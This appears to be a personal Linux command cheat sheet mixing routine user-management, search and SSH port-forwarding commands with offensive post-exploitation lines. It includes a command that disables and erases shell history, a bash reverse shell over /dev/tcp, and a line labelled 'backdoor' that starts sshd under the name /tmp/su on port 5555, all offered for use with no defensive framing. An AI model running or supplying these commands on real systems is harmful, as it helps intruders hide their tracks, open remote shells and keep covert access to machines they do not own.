

#linux

/usr/sbin/useradd username                          #create user
echo NewPasswd | passwd --stdin username            #set pass
/usr/sbin/userdel  -r username                                #delete user


unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0     


#scp shell
#! /usr/bin/expect -f 
spawn scp 1.txt koven@192.168.0.2:/tmp
set timeout 10
expect "*password:"
exec sleep 2
send "your password\r"
expect eof



bash -i ^>^& /dev/tcp/0.0.0.0/1088 0^>^&1




find  / -name '*' -exec grep -l "value" {} \; -exec grep -n  "value" {} \; >/tmp/res


kill `ps -ef |grep nginx | cut -b 9-14`


#Remote Forward
<local port>:<remote host>:<remote port> <SSH hostname>
ssh -C -f -N -g -R 3306::3306 root@8.8.8.8 -p 22

#Local Forward
ssh -g -L  3306:8.8.8.8:3306  master@8.8.8.8


backdoor
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;


